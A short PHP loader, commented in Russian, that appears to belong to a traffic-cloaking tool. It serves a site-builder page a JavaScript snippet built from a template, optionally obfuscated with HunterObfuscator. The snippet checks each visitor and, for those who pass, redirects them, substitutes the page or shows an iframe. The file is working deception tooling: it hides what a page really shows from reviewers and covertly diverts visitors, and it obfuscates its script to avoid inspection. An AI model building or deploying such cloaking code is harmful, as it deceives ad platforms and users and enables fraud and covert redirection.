<?php
//Этот файл необходимо подключить к любому конструктору, используя
//следующий код: <script src="https://ваш.домен/js/index.php"></script>
//в случае прохождения пользователем проверки, будет совершено действие, которое
//вы указали для js-подключения: редирект, подмена или показ iframe
require_once __DIR__.'/obfuscator.php';
require_once __DIR__.'/../settings.php';
require_once __DIR__.'/../requestfunc.php';
if ($use_js_checks) {
    header('Content-Type: text/javascript');
    $jsCode= str_replace('{DOMAIN}', get_cloaker_path(), file_get_contents(__DIR__.'/connect.js'));
    if ($js_obfuscate) {
        $hunter = new HunterObfuscator($jsCode);
        echo $hunter->Obfuscate();
    } else {
        echo $jsCode;
    }
} else {
    include 'process.php';
}
